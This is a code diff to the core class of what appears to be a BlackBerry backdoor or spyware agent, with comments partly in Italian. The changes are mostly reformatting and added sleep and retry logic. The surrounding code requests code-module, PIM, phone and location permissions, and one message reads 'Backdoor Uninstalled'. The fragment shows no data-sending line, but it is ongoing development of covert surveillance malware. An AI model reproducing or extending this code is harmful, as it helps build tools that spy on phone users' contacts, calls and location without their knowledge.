@@ -9,10 +9,8 @@
 package blackberry;
 
 import net.rim.device.api.applicationcontrol.ApplicationPermissions;
-import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
-//#ifdef HAVE_REASON_PROVIDER
-import net.rim.device.api.system.ApplicationDescriptor;
-//#endif
+import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager; //#ifdef HAVE_REASON_PROVIDER
+import net.rim.device.api.system.ApplicationDescriptor; //#endif
 import blackberry.config.InstanceKeys323;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
@@ -61,7 +59,7 @@ public final class Core implements Runnable {
      * Instantiates a new core.
      */
     private Core() {
-               
+
         task = Task.getInstance();
         Utils.sleep(1000);
         // Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
@@ -79,14 +77,7 @@ public final class Core implements Runnable {
         // #debug debug
         debug.trace("Antenna: " + antennaInstalled);
 
-       
-
         Encryption.init();
-
-        /*
-         * Core core = Core.getInstance(); core.run();
-         */
-
     }
 
     /**
@@ -124,7 +115,8 @@ public final class Core implements Runnable {
         // Set up and attach a reason provider
         //#ifdef HAVE_REASON_PROVIDER
         final CoreReasonProvider drp = new CoreReasonProvider();
-        apm.addReasonProvider(ApplicationDescriptor.currentApplicationDescriptor(), drp);
+        apm.addReasonProvider(ApplicationDescriptor
+                .currentApplicationDescriptor(), drp);
         //#endif
 
         int[] wantedPermissions = new int[] {
@@ -135,20 +127,19 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
                 ApplicationPermissions.PERMISSION_PIM,
                 ApplicationPermissions.PERMISSION_PHONE,
-                ApplicationPermissions.PERMISSION_LOCATION_API
-        };
-        
+                ApplicationPermissions.PERMISSION_LOCATION_API };
+
         //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
-        
+
         boolean allPermitted = true;
-        for(int i = 0; i< wantedPermissions.length; i++){
+        for (int i = 0; i < wantedPermissions.length; i++) {
             int perm = wantedPermissions[i];
-            
-            if(original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW){
+
+            if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
                 allPermitted = false;
             }
         }
-                       
+
         if (allPermitted) {
             // All of the necessary permissions are currently available
             // #debug info
@@ -165,11 +156,11 @@ public final class Core implements Runnable {
         // user.
         // Please only request the permissions needed for your application.
         final ApplicationPermissions permRequest = new ApplicationPermissions();
-        for(int i = 0; i< wantedPermissions.length; i++){
+        for (int i = 0; i < wantedPermissions.length; i++) {
             int perm = wantedPermissions[i];
             permRequest.addPermission(perm);
         }
-       
+
         final boolean acceptance = ApplicationPermissionsManager.getInstance()
                 .invokePermissionsRequest(permRequest);
 
@@ -229,6 +220,10 @@ public final class Core implements Runnable {
                 // decidere se e' un uninstall
                 Msg.demo("Backdoor Uninstalled, reboot the device");
                 break;
+            } else {
+                //#debug info
+                debug.info("Waiting a while before reloading");
+                Utils.sleep(2000);
             }
         }
 
@@ -237,6 +232,8 @@ public final class Core implements Runnable {
 
         // #debug
         Debug.stop();
+
+        Utils.sleep(2000);
 
         System.exit(0);
     }
